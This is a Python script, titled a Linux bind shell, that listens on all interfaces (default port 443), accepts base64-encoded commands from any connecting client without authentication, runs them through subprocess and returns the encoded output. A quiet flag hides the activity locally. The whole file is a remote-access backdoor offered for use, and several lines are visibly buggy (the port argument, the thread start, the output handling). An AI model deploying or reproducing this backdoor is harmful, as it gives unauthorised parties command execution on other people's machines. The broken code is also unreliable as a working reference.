__author__ = 'Tim Schughart'
'''Linux Bind Shell'''

import socket
import subprocess
import argparse
import threading
import base64

parser = argparse.ArgumentParser(description='ProSec rockZ')
parser.add_argument("-p", "--port", default=443,dest="port", action="store", nargs=1, type=int, help="Specifies target port")
parser.add_argument("-q", "--quiet", dest="silent", action="store_true", help="Specifies if the target should output commands, its a boolean")

args = parser.parse_args()

ip="0.0.0.0"
silent=args.silent
port=args.port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((ip, port))
s.listen(10)

def handle_client(client_socket):
    request = base64.b64decode(client_socket.recv(4096))

    if not silent:
        print("Recieved command: %s" %(request))
    args = request.split()
    print(args)
    try:
        output=subprocess.check_output(request)
    except Exception as e:
        print('Error while executing command')
        print(e)
    client_socket.send(base64.b64encode(output.encode('ASCII')))
    client_socket.recv(4096)
#    client_socket.close()

while True:
    client, addr = s.accept()
    if not silent:
        print("Accepted connection from: %s" %(addr)[0])
    client_handler = threading.Thread(target=handle_client(client,),)
    client_handler.start()